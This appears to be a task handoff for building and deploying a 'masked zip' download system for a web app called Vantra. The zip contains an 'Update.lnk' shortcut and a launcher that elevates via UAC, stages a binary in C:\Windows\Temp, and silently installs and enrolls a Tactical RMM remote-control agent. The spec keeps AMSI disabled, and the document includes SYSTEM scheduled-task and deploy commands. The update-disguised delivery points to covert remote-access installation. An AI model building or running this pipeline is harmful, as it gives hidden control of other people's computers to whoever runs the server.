# TASK: Ship the corrected ZIP flow to live (auth token fix + elevation) — end-to-end test

**Status:** ROOT CAUSE resolved (2026-09-14). Payload fix is already DEPLOYED on the
VPS. One web-app code change (auth token) + one launcher elevation decision remain,
then push live after an end-to-end pass. See `HANDOFF-LAUNCHER-ZIP-DEBUG.md`.

## Background (what we already proved / did — do not re-derive)
- Bug B (spurious 502) FIXED+DEPLOYED (`d49b85c`).
- The correct payload is `tacticalrmm.exe` ("Tactical RMM Agent: 2.11.0",
  12,314,624 B) extracted from the official
  `tacticalagent-v2.11.0-windows-amd64.exe`. It implements
  `-m install --api --client-id --site-id --agent-type --auth`. No code-signing needed.
- It is now the generator payload on the VPS (sha `920f59ba…`), service restarted,
  verified `ready:true` and `payload round-trip byte-identical (12314624 bytes)`.
- **Enrollment blocker proven:** the flow embeds the deployment **`uid`** as
  `--auth`, but RMM `/api/v3/installer/` validates the deployment's **knox
  `token_key`**. `GET /api/v3/installer/` returns 200 with `token_key`, 401 with `uid`.
  With the correct `token_key` the agent installs+enrolls and a device appears
  (verified: `agents_agent id=4`, site 36, version 2.11.0).

## Exact fix to implement

### 1) Web app — use `token_key` for `--auth` (in `/Users/mikeolab/vantra`)
The deployment `uid` stays the download-URL token; the auth token must be `token_key`.

- **RMM** (`/rmm/api/tacticalrmm/clients/serializers.py`): make `token_key` readable:
  - Add `"token_key"` to `DeploymentSerializer.Meta.fields` (so `GET
    /clients/deployments/` returns it), **or**
  - make `AgentDeployment` (`clients/views.py` POST) return the created Deployment
    serialized with its `token_key`.
- **Vantra `lib/trmm.ts createDeployment()`**: return BOTH `uid` (for the deploy URL)
  and `token_key` (for `--auth`), reading `token_key` from the deployment list (most
  recent for the site) — mirror the existing `match` logic.
- **`app/api/devices/deployments/route.ts`**: pass `authToken = token_key` to
  `callZipGenerator`, keep `exeUrl = /clients/<uid>/deploy/`.
- `lib/zip-generator.ts` — no change (already forwards `authToken`).

### 2) Launcher elevation (decision) — `generator/launcher/native/launcher.c` or manifest
The launcher must run elevated to write `C:\Windows\Temp` staging + install the agent
service. Recommended: give `Launcher.exe` a `requireAdministrator` (asInvoker is the
current default) `requestedExecutionLevel` so a customer double-click raises UAC once,
then everything downstream (staging → `-m install`) runs elevated. Keep AMSI `none` and
do NOT weaken `/build`. Headless test path: run `Launcher.exe`/`_stg_*.exe` via an
elevated scheduled task (`schtasks /Create … /RU SYSTEM /RL HIGHEST`).

### 3) Deploy + restart
```
# web app
cd /Users/mikeolab/vantra && git pull && cd /opt/vantra && git pull       # ship code
# (or rebuild + restart per repo's deploy flow)
systemctl restart vantra
# generator is already live with the correct payload; restart if sources changed
systemctl restart vantra-msi-generator
# health gate must stay green
curl -s http://localhost:4000/healthz   # → ready:true, payload sha 920f59ba…
```

## End-to-end acceptance (do NOT skip)
1. In the app: "Add Device" → create a device (site/client per product + a fresh 72h
   deployment). Confirm `Deployment.token_key` is used as `--auth` and `uid` as `exeUrl`.
2. GET the masked zip (`dl.instaweb.top/d/<jobId>`), extract `Update.lnk` + `Launcher.exe`
   to a fresh folder, double-click `Update.lnk` on the interactive VM desktop, approve UAC.
3. Confirm `C:\Windows\Temp\_stg_<TAG>.exe` appears (staging) and the agent installs
   (service `A1Agent` + `C:\Program Files\TacticalAgent`) and the device shows
   **Online** in Vantra with no manual steps.
4. Watch for the previously-seen trailing `The system cannot find the file specified`
   service-start error — this should be gone once the agent runs from Program Files.
   If it recurs, fix the service binary path / install ordering in the agent install path.
5. Regression: Bug B unaffected (decompressed-Update.lnk trigram scan stays).

## Out of scope / guardrails
- Do NOT weaken `/build` auth. AMSI stays `none`.
- Do NOT change `LATEST_AGENT_VER` (2.11.0 is current) or add a code-sign token.
- Keep the corrected payload file on the VPS; do not re-import the old bootstrap.